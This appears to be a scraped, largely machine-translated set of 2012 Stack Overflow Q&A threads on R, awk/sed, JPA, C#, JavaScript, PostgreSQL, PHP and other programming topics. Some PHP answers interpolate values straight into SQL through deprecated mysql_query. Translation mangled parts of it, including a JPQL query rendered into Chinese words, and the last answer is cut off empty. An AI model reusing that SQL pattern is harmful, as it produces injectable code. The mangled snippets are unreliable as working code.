* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-10-12T20:05:33.220

您可以使用`MouseEvent.getX()`和`MouseEvent.getY()`分别获取 X 和 Y 的相对坐标。

```
int relativeX = e.getX();
int relativeY = e.getY();
... 
```

# r - 删除 'NA's 之后的文件行

> ID：12866206
> 
> 赞同：2
> 
> 时间：2012-10-12T19:57:46.890
> 
> 标签：r, awk, sed

我的数据以特定方式排列，没有标题，并且列不一定包含相同类型的信息。它的一部分可以使用：

```
data <- textConnection("rs123,22,337647,C,T
1,7385,0.4156,-0.0019,0.0037
1,16550,0.959163800640972,-0.0241,0.0128
1,17218,0.0528,0.015,0.039
rs193,22,366349,C,T
1,7385,0.3708,0.0017,0.0035
1,16550,0.793259111116741,-0.0028,0.009
1,17218,0.9547,-0.016,0.033
rs194,22,366300,NA,NA
0,0,0,0,0
0,0,0,0,0
0,0,0,0,0
rs118,22,301327,C,T
1,7385,0.0431,-0.0085,0.0077
1,16550,0.789981059331214,0.0036,0.0092
1,17218,0.99,-0.057,0.062
rs120,22,497528,C,G
1,7385,0.0716,0.0012,0.0073
1,16550,0.233548238634496,-0.0033,0.0064
1,17218,0.4563,-0.002,0.015
rs109,22,309825,A,G
1,5520,0.8611,2e-04,0.0044
0,0,0,0,0
1,17218,0.9762,0.076,0.044
rs144,22,490068,C,T
0,0,0,0,0
0,0,0,0,0
1,17218,0.2052,-0.013,0.032")
mydata <- read.csv(data, header = F, sep = ",", stringsAsFactors=FALSE) 
```

我的问题是这样的：我可以写一行到 grep/awk 包含“NA”的行（这些是不包含数据的 SNP）

```
grep -v 'NA' file.in > file.out 
```

但是，我怎样才能同时指定以下 3 行也被删除？我不想删除包含全零的每一行，只删除包含所有零的行，这些行跟随包含带有“NA”的 SNP 的行。

谢谢您的意见！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-12T20:07:24.917

使用`GNU sed`（因为地址后面的行数是扩展名）：

```
sed -e '/NA/,+3 d' infile 
```

* * *

**编辑**以添加`awk`解决方案：

```
awk '/NA/ { for ( i = 1; i <= 4; i++ ) { getline; } } { print }' infile 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-12T20:21:41.170

更新：我之前的回答可能是错误的，所以我有这个选择：

```
nas <- apply(mydata, 1, function(x) any(is.na(x)))
s <- apply(mydata == 0, 1, all)
out <- which(nas)
for (i in which(nas)) {
  j <- i + 1
  while (!is.na(s[j]) && s[j]) {
    out <- c(out, j)
    j <- j + 1
  }
}
mydata2 <- mydata[-out,] 
```

起初我以为你只关心 NA 之后的前 3 行，但似乎你真的想删除每个 NA 后所有连续的行，全为零。

（这是我之前的回答：）

```
nas <- apply(mydata, 1, function(x) any(is.na(x)))
whereToLook <- sort(which(nas) + 1:3)
s <- apply(mydata == 0, 1, prod)
zeros <- which(s == 1)
whereToErase <- zeros[zeros %in% whereToLook]
whereToErase <- c(which(nas), whereToErase) 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-10-12T20:37:59.777

导入 R 后，您可以执行以下操作：

```
# identify the rows containing any NA's
narows <- which(apply(mydata,1,function(x) any(is.na(x))))
# identify the rows containing all 0's
zerorows <- which(apply(mydata==0,1,all))

# get the rows that either contain NAs, or are all 0 and are 
# within 3 of the NA rows
rowstodelete <- c(narows,
                  intersect(
                    (sapply(c(narows),function(x) seq(x,x+3))),
                    zerorows
                  )
                )

# subset mydata to only remove the NA rows + the following 3 "zero rows"
mydata[-rowstodelete,] 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-10-13T06:52:29.297

这可能对您有用（GNU sed）：

```
 sed '/\<NA\>/!b;:a;$!N;s/\n\(0,\)\+0$//;ta;D' file 
```

这将删除任何包含的行`NA`和任何以下`0,...0`行

# jpa - JPA @OneToMany not fetching the childern

> ID：12866209
> 
> 赞同：2
> 
> 时间：2012-10-12T19:57:56.783
> 
> 标签：jpa, one-to-many, eager-loading, many-to-one

Following is the table structure:

```
desc customer_survey
Name        Null     Type         
----------- -------- ------------ 
SURVEYID    NOT NULL VARCHAR2(10) 
CUSTNO      NOT NULL VARCHAR2(10) 
SRNO                 NUMBER(10)   
AVGRATINGS           NUMBER(5,2)  
COMMENTS             VARCHAR2(50) 
SENTON               DATE         
RESPONDEDON          DATE         

desc Survey_response
Name             Null     Type         
---------------- -------- ------------ 
SURVEYRESPONSEID NOT NULL NUMBER(10)   
RATINGS          NOT NULL NUMBER(2)    
QNO              NOT NULL VARCHAR2(10) 
SURVEYID         NOT NULL VARCHAR2(10) 
```

Java classes:

```
 public class CustomerSurvey implements Serializable {

@OneToMany(fetch=FetchType.EAGER, mappedBy="customerSurvey", 
     cascade=CascadeType.ALL)
private Set<SurveyResponse> responses;
 ......

 public class SurveyResponse {

@ManyToOne(fetch=FetchType.LAZY)
@JoinColumn(name="SURVEYID", referencedColumnName="surveyId")
private CustomerSurvey customerSurvey;

 ...... 
```

Client code:

```
 List<CustomerSurvey> surveys = workService.getSurveysByCustomer("testCNo2");
 System.out.println("surveys size = " + surveys.size());

 for(CustomerSurvey survey: surveys) {
System.out.println("getting responses from the survey object now..");
Set<SurveyResponse> responses = survey.getResponses();
System.out.println("responses size= .." + responses.size());
 } 
```

console shows:

surveys size = 1 getting responses from the survey object now.. responses size= ..0

whereas there are 7 responses in the DB for the selected survey.

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-15T13:51:30.933

启用日志记录并查看 SQL 是否正确。

从您不完整的代码中很难看出，但一般来说，OneToMany 不应该使用 JoinColumn，它应该使用 mappedBy，并且 ManyToOne 中的连接列应该引用对象的 Id。

还要确保在插入对象时设置关系的双方。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-24T18:49:22.000

[这个链接](https://stackoverflow.com/questions/9711148/jpa-not-eagerly-loading-everything)有帮助。我将集合设置回惰性。在
持久性类中，在获得结果集后的事务中，我现在将 getResponses 称为：

```
List<CustomerSurvey> surveys = query.getResultList();
for (CustomerSurvey survey : surveys) {
    Set<SurveyResponse> responses = survey.getResponses();
} 
```

填充响应。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-06-07T15:07:26.093

另一种选择是使用 jpql fetch 查询填充关系：

“从调查调查中选择调查加入获取调查.responses”

我有同样的问题，但仍然无法找出问题所在。在我的情况下，父实体是由 jpql 查询加载的，因此扩展它提供了一种解决方法

# c# - how to check if the character is an integer

> ID：12866214
> 
> 赞同：27
> 
> 时间：2012-10-12T19:58:26.393
> 
> 标签：c#

I am looking for a function that can check the character if it is a integer and do something is so.

```
char a = '1';

if (Function(a))
{
  do something
} 
```

* * *

## 回答 #1

> 赞同：36
> 
> 时间：2012-10-12T19:59:57.797

使用[System.Char.IsDigit](http://msdn.microsoft.com/en-us/library/0t641e58.aspx)方法

* * *

## 回答 #2

> 赞同：23
> 
> 时间：2012-10-12T20:04:18.410

如果您只想要纯`0-9`数字，请使用

```
if(a>='0' && a<='9') 
```

`IsNumeric`并且`IsDigit`对于 0-9 范围之外的某些字符都返回 true：

[C#中 Char.IsDigit() 和 Char.IsNumber() 的区别](https://stackoverflow.com/questions/228532/difference-between-char-isdigit-and-char-isnumber-in-c-sharp)

* * *

## 回答 #3

> 赞同：6
> 
> 时间：2012-10-12T19:59:52.447

`Integer.TryParse`效果很好。

[http://msdn.microsoft.com/en-us/library/f02979c7.aspx](http://msdn.microsoft.com/en-us/library/f02979c7.aspx)

* * *

## 回答 #4

> 赞同：5
> 
> 时间：2015-12-10T20:13:17.217

该`bool Char.IsDigit(char c);`方法应该非常适合这种情况。

```
char a = '1';

if (Char.IsDigit(a))
{
  //do something
} 
```

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2012-10-12T20:02:24.363

尝试使用`System.Char.IsDigit`方法。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2012-10-12T20:00:56.783

试试`Char.IsNumber`。文档和示例可以在[这里找到](http://msdn.microsoft.com/en-us/library/yk2b3t2y.aspx)

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2012-10-12T20:03:31.620

最好只使用 switch 语句。就像是：

```
switch(a)
{
  case '1':
    //do something.
    break;
  case '2':
    // do something else.
    break;
  default: // Not an integer
    throw new FormatException();
    break;
} 
```

只要您只查找字符 0-9，这将起作用。除此之外的任何东西（比如“10”）都是字符串而不是字符。如果您只想查看某个输入是否为整数并且输入是否为字符串，则可以执行以下操作：

```
try
{
  Convert.ToInt32("10")
}
catch (FormatException err)
{
  // Not an integer, display some error.
} 
```

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2017-06-23T10:40:59.640

最简单的答案：

```
char chr = '1';
char.isDigit(chr) 
```

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2019-04-23T08:45:53.810

我必须检查字符串的第一个字符，**如果第三个字符是数字**，并使用**MyString.All(char.IsDigit)**进行检查：

```
if (cAdresse.Trim().ToUpper().Substring(0, 2) == "FZ" & cAdresse.Trim().ToUpper().Substring(2, 1).All(char.IsDigit)) 
```

# javascript - 当 JSON2 重载时访问本机 JSON 对象

> ID：12866225
> 
> 赞同：2
> 
> 时间：2012-10-12T19:59:06.600
> 
> 标签：javascript, json, dom, cross-domain, bookmarklet

我正在实现一个通过 JSON-RPC 协议与 iframe 通信的小书签。

然而，一些网站，例如 cnn.com 会加载 JSON2，`window.JSON`尽管浏览器已经有一个原生的 JSON 对象。

问题是，在我的 iframe 中，我不想遵循同样的错误做法，而且 JSON2 似乎与 Mozilla Firefox 和 Chrome 上的本机 JSON 不兼容：

因此，当我在本机 JSON 和 JSON2 上运行 stringify 时，我得到以下结果：

```
JSON.stringify({key: "value"}) 
```

### JSON2

```
{key:"value"} 
```

### 原生 JSON

```
{"key":"value"} 
```

（密钥包含在 中`"`）

* * *

`"`问题是，当JSON2 生成的字符串中缺少 并引发错误时，本机 JSON 不喜欢它：

火狐浏览器：`SyntaxError: JSON.parse: expected property name or '}'`

谷歌浏览器：`SyntaxError: Unexpected token k`

为了彻底解决这个问题，我需要确保使用与解码字符串相同的 JSON 库来编码字符串。

一种方法是确保在双方都使用 JSON2 或 JSON3，但我想尽可能使用本机 json 库。

所以现在像 cnn.com 这样的网站已经覆盖了原生 JSON 库，我怎样才能回到它呢？

我也许可以创建一个指向同一个域的 iframe 并从中获取 JSON 对象`contentWindow`，但这会非常低效。

没有更好的方法吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-12T21:07:41.963

不确定我是否正确理解您的问题

如果你像这样放置一个空的 iframe

```
<iframe id="testFrame" name="testFrame" src="about:blank" style="display:none;"></iframe> 
```

那么你也可以从js调用

```
testFrame.JSON.stringify(obj); 
```

唯一的问题是如果你在`https:`src 中使用它可能是`javascript:false`你需要支持 IE6

编辑：我仍然认为我不值得被接受的答案，所以我想出了你的代码的修改版本

```
(function($) {
  var frm;
  $.getNative = function(objectName, callback) {
    if (!frm) {
      frm= $("<iframe>", {
        src: "javascript:false",
        style: "display:none;"
      }).appendTo("body").load(function(){
        callback(this.contentWindow[objectName]);
        // $(this).remove(); <-- this is commented to cache the iframe
      });
    }
    callback(frm[0].contentWindow[objectName]);
  }
})(jQuery) 
```

这将使您能够`$.getNative()`在文档中多次使用，而无需每次都重新创建框架。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-12T22:21:00.723

到目前为止，最好的解决方案是使用 iframe，但正如 Crisim Il Numenoreano 指出的那样，它应该指向`about:blank`or `javascript:false`。到目前为止，这似乎工作正常：

```
function getNative(objectName, callback) {
    $("<iframe>", {
        src: "javascript:false",
        style: "display:none;"
    }).appendTo("body").load(function(){
        callback(this.contentWindow[objectName]);
        $(this).remove();
    });
}

//Use like this:

getNative("JSON", function(JSON) {
    console.log(JSON.stringify({key: "value"}));
}); 
```

请注意，对于小书签，jquery 必须从可靠的来源获取并在本地范围内进行保护。

# entity-framework - 代码优先 - 鉴别器为 NULL 或 NOT NULL 时的映射

> ID：12866227
> 
> 赞同：0
> 
> 时间：2012-10-12T19:59:22.267
> 
> 标签：entity-framework, ef-code-first, code-first, table-per-hierarchy, table-per-subclass

我想在 EF5 Code First 中使用 TPH 继承。我想基于数据库中的列是否为空。

我发现这个链接表明它在 EF4 中是不可能的。[实体框架 4 - 特征 CTP5（代码优先）中的 TPH 继承与“IS NULL”鉴别器](https://stackoverflow.com/questions/5019717/entity-framework-4-tph-inheritance-in-features-ctp5-code-first-with-is-null)

这是否已在 EF5 中修复？如果是这样，语法是什么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-19T16:23:01.593

请参阅以下位置的讨论和答案： [http ://social.msdn.microsoft.com/Forums/en-US/adodotnetentityframework/thread/1045bd0c-29dd-4e23-9d50-2f315e89eefd](http://social.msdn.microsoft.com/Forums/en-US/adodotnetentityframework/thread/1045bd0c-29dd-4e23-9d50-2f315e89eefd)

它尚未在 EF5 中实现

# c - 使用 Postgres 测试文件是否存在

> ID：12866228
> 
> 赞同：2
> 
> 时间：2012-10-12T19:59:29.920
> 
> 标签：c, postgresql

我需要创建一个函数来测试 postgres 是否存在文件。我正在用 C 语言做，但我遇到了问题。代码是：

```
#include "postgres.h"
#include <string.h>
#include "fmgr.h"
#include <stdio.h>
#include<sys/stat.h>

#ifdef PG_MODULE_MAGIC
PG_MODULE_MAGIC;
#endif

/* by value */

PG_FUNCTION_INFO_V1(file_exists);
Datum
file_exists (PG_FUNCTION_ARGS)
{
   text *fileName= PG_GETARG_TEXT_P(0);

   struct stat buf;
   int i = stat(fileName, &buf);
     /* File found */
     if ( i == 0 )
     {
       PG_RETURN_INT32(1);
     }
     PG_RETURN_INT32(0);

} 
```

我认为问题出在“stat”函数中的第一个参数上，因为 fileName 是一个文本，而这个函数接收一个字符。

这是我第一次编写 C 代码，所以可能一切都错了。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-10-13T00:13:46.453

如果您深入研究标题，您会在以下位置找到`server/c.h`：

```
/* ----------------
 *      Variable-length datatypes all share the 'struct varlena' header.
 *...
 */
struct varlena
{
    char        vl_len_[4];     /* Do not touch this field directly! */
    char        vl_dat[1];
};

#define VARHDRSZ        ((int32) sizeof(int32))

/*
 * These widely-used datatypes are just a varlena header and the data bytes.
 * There is no terminating null or anything like that --- the data length is
 * always VARSIZE(ptr) - VARHDRSZ.
 */
typedef struct varlena bytea;
typedef struct varlena text; 
```

所以这是你对`text`数据类型的定义。请注意评论中这个相当重要的部分：

> 没有终止 null 或类似的东西

这表明您绝对不想将`fileName->data`其视为 C 字符串，除非您喜欢 segfaults。您需要一种将 a 转换为`text`可以交给的以空字符结尾的 C 字符串的方法`stat`；有一个功能：`text_to_cstring`。

`text_to_cstring`我能找到的唯一文档是[源代码中的这条评论](http://doxygen.postgresql.org/varlena_8c_source.html#l00121)：

```
/*
 * text_to_cstring
 *
 * Create a palloc'd, null-terminated C string from a text value.
 *
 * We support being passed a compressed or toasted text value.
 * This is a bit bogus since such values shouldn't really be referred to as
 * "text *", but it seems useful for robustness.  If we didn't handle that
 * case here, we'd need another routine that did, anyway.
 */ 
```

还有[一个使用它的例子](http://www.postgresql.org/docs/current/static/spi-examples.html)：

```
char *command;
/*...*/

/* Convert given text object to a C string */
command = text_to_cstring(sql);

/*...*/
pfree(command); 
```

你应该能够做这样的事情：

```
struct stat buf;
char *fileName = text_to_cstring(PG_GETARG_TEXT_P(0)); 
int i = stat(fileName, &buf);
pfree(fileName); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2015-01-08T11:32:46.587

我遇到过同样的问题。text_to_cstring 对我不起作用，然后我意识到问题是我没有包含 text_to_cstring func 的头文件。那是多么愚蠢。所以我不得不在 /usr/include/postgresql/your_version/server/utils/ 文件夹中搜索，直到我最终找到它，然后一切正常。尝试

```
char *filename = text_to_cstring(PG_GETARG_TEXT_PP(0)); 
```

但不要忘记包含第一个 builtins.h

```
#include "utils/builtins.h" 
```

# full-text-search - 对字符串“number”后的数字求和

> ID：12866230
> 
> 赞同：1
> 
> 时间：2012-10-12T19:59:37.790
> 
> 标签：full-text-search, text-processing

我有一个带有单词和正数的文本文件，由一些空格分隔，例如

```
A dog has a ball number 49     number    34 number    A
Cats number   58
... 
```

我想总结字符串“数字”之后出现的所有数字。如果在字符串“number”之后不是数字，那么没关系。

例如，在这种情况下，答案将是 49+34+58，即`141`.

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-12T20:03:56.807

```
awk '{ for (i = 1; i <= NF; i++) s = s+$i }; END { print s+0 }' test.txt 
```

awk 读取文件，每行一行。对于每一行，都会`{}`执行标记的块。块可以由一个条件保护：正则表达式、...、和`BEGIN`，`END`它们分别对于第一行和最后一行是“真”。

这意味着 awk 为每一行执行第一个块（因为它是无人看管的）。

此外，awk 并没有真正的类型系统——所有字符串。但是您可以对字符串使用算术 - 在这种情况下，它们会神奇地转换为数字。如果您对不是数字的字符串进行算术运算，它们的计算结果为“0”。这意味着：“asdf”+ 1 = 1；2+4 = 6；"asdf" + 0 = 0;

变量不必声明 - 并且默认为空字符串，其数值为“0”。

awk 的下一个令人敬畏的地方是它会自动将当前输入行拆分为字段。可以指定字段分隔符，但默认为空格。单个字段可以通过`$1`, `$2`, ...访问`$NF`，即`NF`字段数。`$0`是完整输入行的内容。

就这样：您查看当前行的所有“字段”。所有字段的数值（字符串为 0）在变量中累积`s`。阅读完所有内容 ( `END`) 后，将打印总和。

编辑：这可能很方便，但并不能真正回答问题，因为它不考虑“数字” - 抱歉。

修复：

```
awk '{ for (i = 1; i <= NF; i++) if ($i == "number") {s = s+$(++i)} }; END { print s+0 }' test.txt 
```

这样，它也会导致 141 输入，例如：

10 狗有球 号码 49 号码 34 号码 A 猫 1000 号码 58

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-10-15T04:26:01.137

`number`您可以通过设置为记录分隔符来用 awk 分隔输入：

```
awk -v RS=number '{ sum += $1 } END { print sum }' infile 
```

这是一个 grep、coreutils 和 bc 替代方案：

```
(<infile grep -Eoi 'number[[:blank:]]+[0-9]+' \
| tr -s '[:blank:]' | cut -d' ' -f2 | head -c -1 \
| tr '\n' '+'; echo
) | bc 
```

输出：

```
141 
```

# android - 将数据流从 adb 重定向到本地实用程序 - Android

> ID：12866232
> 
> 赞同：0
> 
> 时间：2012-10-12T19:59:42.320
> 
> 标签：android, stream, pipe, adb

我需要在我的实用程序中使用 android 下的设备提供的数据流。

在标准 Linux 发行版下，我将执行以下操作：

```
util -input /dev/random 
```

和`adb`Android 我想使用`/dev/random`来自 Android 设备的 a 作为我本地的输入`util`。我应该如何创建这个管道？

如果我做

```
adb pull /dev/random random 
```

adb 在转储 1 个完整副本后才退出，但我需要一个恒定的管道/流。

谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-13T05:46:45.870

你应该使用这样的东西

```
$ adb shell dd if=/dev/random | util -input - 
```

前提是如果`-`指定了您的 util 从 stdin 读取。

另请注意，该命令使用的是非阻塞随机源。

# ruby-on-rails - Colorbox-rails 内联内容

> ID：12866234
> 
> 赞同：1
> 
> 时间：2012-10-12T19:59:49.657
> 
> 标签：ruby-on-rails, gem, colorbox

在我安装 colorbox-rails 之后

**按照此页面上的说明进行操作：[http](http://rubydoc.info/gems/colorbox-rails/0.0.9/file/README.rdoc) ://rubydoc.info/gems/colorbox-rails/0.0.9/file/README.rdoc **这是自述文件所说的用于 link_to 的内容

```
<%= link_to "My superb link", "#", :data => { :colorbox => true } %> 
```

我将此添加到我的 link_to

```
:data => { :colorbox => true } 
```

它会弹出一个窗口，但我无法让它链接到我想要的内容。它将在颜色框中显示您所在的页面或错误消息“此内容无法加载”。

我正在尝试在颜色框中获取联系表。

我正在运行 Rails 3.2.8

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-12T20:02:32.723

做

```
<%= link_to "My superb link",show_contact_path(@contact.id), :data => { :colorbox => true } %> 
```

**编辑**

你也可以做

```
// Called directly, without assignment to an element:
$(".myElement").colorbox({href:"thankyou.html"});

// Called directly with HTML
$(".myElement").colorbox({html:"<h1>Welcome</h1>"}); 
```

[http://www.jacklmoore.com/colorbox](http://www.jacklmoore.com/colorbox)

只要确保为元素创建选择器`class="myElement"`

也（归功于一二三）

> 如果链接是外部链接（即，转到您自己的应用程序以外的站点），您需要指定 iframe 属性，如下所示 `:colorbox_iframe => true`

# database - 需要帮助了解脚本格式和查询之间的区别

> ID：12866248
> 
> 赞同：6
> 
> 时间：2012-10-12T20:00:25.330
> 
> 标签：database

这是一个非常新手的问题，我担心......我想知道这里是否有人可以告诉我 SQL 脚本和 SQL 查询之间的区别（我无意中互换使用这些术语已经太久了）。

我有很多执行查询（SQL server、oracle、postgres）的经验，但我开始与一个小组合作，该小组要求我通过他们的部门提交带有上述 SQL 查询的脚本以供审查，并明确告诉我不要向他们发送查询，但脚本. 有人可以为我解释一下区别吗？

如果重要的话，我需要提交的 SQL 查询只需将四个表中的字段合并为一个。

如果有人可以帮助我解决这个问题，请提前感谢！

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-10-12T20:14:47.727

在这种情况下，听起来他们希望看到任何将更改数据的命令集（INSERT、UPDATE、DELETE 等），而不关心您正在运行的任何查询以简单地返回或查看数据。

我怀疑更多的人可以互换使用这些术语，而不是你想象的。

回到这个部门并要求澄清是一个非常好的主意，因为不同的团队使用不同的术语。我想您会发现他们要求您提前计划任何数据更改操作，将您的命令按顺序放入文件中（如果您在 Management Studio 中工作，则为 .sql 文件等）并将该文件转发到他们进行审查。

四处打听是一个很好的举动。这些东西你不能太小心！

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-10-12T20:15:54.440

查询由单个命令组成。脚本只是一个包含一堆查询的文件。

请参阅： [http ://docs.oracle.com/cd/E14373_01/user.32/e13370/sql_rep.htm](http://docs.oracle.com/cd/E14373_01/user.32/e13370/sql_rep.htm)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2020-12-17T11:15:08.793

SQL 脚本只不过是在文件中保存一堆 SQL 语句（选择、插入删除、更新等）。

# css - 显示当前菜单项子菜单 211 wordpress

> ID：12866254
> 
> 赞同：0
> 
> 时间：2012-10-12T20:00:57.540
> 
> 标签：css, wordpress, menu, navigation

我正在使用 wordpress 3.4.2 的二十一主题。默认主题菜单在悬停时显示下拉菜单。我想做的是显示当前菜单项的子菜单。到目前为止，我所取得的成就是通过设置 css 属性来显示子菜单`display:visible`。

此链接[http://www.gq.com](http://www.gq.com)显示了我正在尝试实现的示例。

相关的CSS样式如下：

```
#access {
    clear: both;
    display: block;
    float: left;
    margin: 0px auto 15px;
    width: 100%;
    height: 36px;
}

#access ul {
    font-size: 13px;
    list-style: none;
    margin: 0 0 0 -0.8125em;
    padding-left: 0;
}

#access li {
    float: left;
    position: relative;
}

#access a {
    display: block;
    line-height: 2.8em;
    padding: 0 1.2125em;
}

#access ul ul {
    display: none;
    float: left;
    margin: 0;
    position: absolute;
    top: 2.9em;
    left: 0;
    width: 188px;
    z-index: 99999;
}

#access ul ul ul {
    left: 100%;
    top: 0;
}

#access ul ul a {
    border-bottom: 1px dotted #ddd;
    color: #444;
    font-size: 13px;
    font-weight: normal;
    height: auto;
    line-height: 1.4em;
    padding: 10px 10px;
    width: 168px;
}

#access ul li:hover>ul {
    display: block;
} 
```

# php - 从会话数组生成逗号分隔列表

> ID：12866259
> 
> 赞同：0
> 
> 时间：2012-10-12T20:01:05.087
> 
> 标签：php, mysql, arrays, session

我有一个会话数组 [cart]，其中包含用户 ID 号。我正在尝试从联系人表中生成电子邮件地址列表，其中会话中的联系人 ID 号码 = 数据库中的联系人 ID。

这是我的代码。

```
// Find cart members from the session array
foreach ($_SESSION['cart'] as $key=>$val) {
    $contactid = $val;

    // Query the database for cart members
    $cartresult = mysql_query("SELECT contact.email FROM contact WHERE contact.contact_id = '$contactid'");
    $emailresult = mysql_query($emailquery) or DIE (mysql_error());
    while ($r = mysql_fetch_array($emailresult)) { 
        $emailAry[] = $r['email']; 
    }
}

// Create comma separated list from email array
if (count($emailAry)) {
    $list = implode(", ", $emailAry);

    $list = str_replace(" ,", "", $list); 
```

显然 $emailAry 没有任何价值，因为 if 语句被忽略了。

知道为什么会这样吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-12T20:11:31.613

`$emailquery`从我的角度来看是不确定的。

```
 $emailAry = array();

    // Find cart members from the session array
    foreach ($_SESSION['cart'] as $key=>$val) {
        $cartresult = mysql_query("SELECT email FROM contact WHERE contact_id = '$val'");
        while ($r = mysql_fetch_array($cartresult)) { 
            $emailAry[] = $r['email']; 
        }
    }

    // Create comma separated list from email array
    if (count($emailAry)) {
        $list = implode(",", $emailAry);

        // no need to replace ', ' with '', implode will do all the job creating a CSV :)
        //$list = str_replace(" ,", "", $list);
    } 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-12T20:06:18.370

`$emailAry`在外部作用域中声明数组，这样就可以从while和foreach之外的代码中访问它，就像他的：

```
$emailAry = array();
foreach ($_SESSION['cart'] as $key=>$val) {
...
... 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-11-13T22:00:01.293

使用它既简单又快速

```
 $to = '';
 foreach ($result->result() as $row){
    $to .=  $row->id.',';            
 }

 $to = rtrim($to,','); 
```

根据你的改变它。

# php - 为什么给定的 PHP 文件中没有输出

> ID：12866261
> 
> 赞同：1
> 
> 时间：2012-10-12T20:01:06.197
> 
> 标签：php, html

我正在尝试（通过 PHP 文件）计算圆的直径、面积和周长，圆的半径由用户在 html 文件中给出。用户给出半径值，PHP 脚本计算上述数量。问题是当我执行程序时，html 接受输入，但 PHP 脚本没有显示输出。

代码如下：-

**circle.html:-**

```
<html>
  <head>
     <title>Circle</title>
  </head>
  <body>
   <form method="GET" action="circle1.php">
    <center>
    <h1>Circle</h1>
    <table border= 2 width=200>
      <tr align=center>
        <td>Radius</td>
        <td><input type="text" name=radius size=5></td>
      </tr>
      <tr align=center>
        <td colspan=2>
          <input type="submit">
          <input type="reset">
        </td>
      </tr>
    </table>
    </center>
   </form>
 </body>
</html> 
```

**circle1.php:-**

```
<html>
  <head>
     <title>Circle</title>
  </head>
  <body>
     <center>
     <h1>Circle</h1>
     <?php
        define("PI",3.14159,TRUE);
        GLOBAL $d,$c,$a,$r;
        $r=$_GET['radius'];
        $d=2*$r;
        $c=2*PI*$r;
        $a=PI*$r*$r;
     ?>
     <table border = 2 width=200>
        <tr>
           <td>Diameter</td>
           <td><?php echo $d; ?></td>
        </tr>
        <tr>
           <td>Circumference</td>
           <td><?php echo $c; ?></td>
        </tr>
        <tr>
           <td>Area</td>
           <td><?php echo $a; ?></td>
        </tr>
     </table>
     <a href="circle.html"><h2>Back</h2></a>
     </center>
   </form>
   </body>
</html> 
```

抱歉这么长的帖子。任何帮助，将不胜感激。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-12T20:21:04.360

一些服务器设置（例如各种 Amazon Linux AMI）要求您通过 php 打印功能（例如 echo）输出 HTML 以正确执行。如果您有这种类型的设置，那么您需要在输出所有**客户端**HTML之前执行您的**服务器端**PHP 代码。

 **试试这个**circle1.php**：

```
<?php
    define("PI",3.14159,TRUE);
    GLOBAL $d,$c,$a,$r;
    $r=$_GET['radius'];
    $d=2*$r;
    $c=2*PI*$r;
    $a=PI*$r*$r;
echo'
<html>
  <head>
     <title>Circle</title>
  </head>
  <body>
     <center>
     <h1>Circle</h1>
     <table border="2" width="200">
        <tr>
           <td>Diameter</td>
           <td>'.$d.'</td>
        </tr>
        <tr>
           <td>Circumference</td>
           <td>'.$c.'</td>
        </tr>
    <tr>
           <td>Area</td>
           <td>'.$a.'</td>
        </tr>
     </table>
     <a href="circle.html"><h2>Back</h2></a>
     </center>
   </form>
   </body>
</html>';
 ?> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-12T20:32:54.250

你的代码是正确的。您一定有一些与`php.ini`or相关的问题`apache`。通过检查源代码来检查您的`<?php`代码是否正在转义。. 如果是的话，把这段代码放在最上面 `error_reporting(E_ALL);`并尝试调试它。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-12T20:15:24.303

您的代码可以稍微清理一下，但它应该可以工作。它本质上没有任何问题。我从字面上剪切并粘贴它作为测试，它工作正常。

如果第一个页面（纯 HTML）可以工作，但第二个页面（circle1.php）没有任何结果，那么首先要检查的是您的网络服务器是否配置为使用 PHP，以及指向的路径`php.ini`是否准确，因为底线是你的 PHP 解析器不在循环中。

* * *

## 回答 #4

> 赞同：-3
> 
> 时间：2012-10-12T20:09:33.323

您需要用引号封装您的输入属性。

代替

```
<input type="text" name=radius size=5> 
```

和

```
<input type="text" name="radius" size="5"> 
```**

# javascript - IE中是否有AJAX进度事件以及如何使用它？

> ID：12866264
> 
> 赞同：6
> 
> 时间：2012-10-12T20:01:23.527
> 
> 标签：javascript, ajax, internet-explorer, events, progress

我尝试了所有我能想到的至少达到 IE9 中的进度功能，但没有任何效果。所有其他浏览器都可以进入进度功能并毫无问题地编写测试文本。希望有人可以帮助我。谢谢！

```
 var info = document.getElementById('info');
     var xhr;
        if (window.XMLHttpRequest) {
            xhr = new XMLHttpRequest();  
        } 
        else if (window.ActiveXObject) { 
            try {  
                xhr = new ActiveXObject("Msxml2.XMLHTTP");  
            } 
            catch (e) {  
                try {  
                    xhr = new ActiveXObject("Microsoft.XMLHTTP");  
                } 
                catch (e) {}  
            }  
        }
        xhr.attachEvent("onprogress", function(e) {
            info.innerHTML += "loading...<br />";   
        });

        /*xhr.addEventListener("progress", function(e) {
            info.innerHTML += "loading...<br />";   
        }, false);*/

        xhr.open("GET", "10_MB_File.txt", true);
        xhr.send(null); 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-12T20:12:55.400

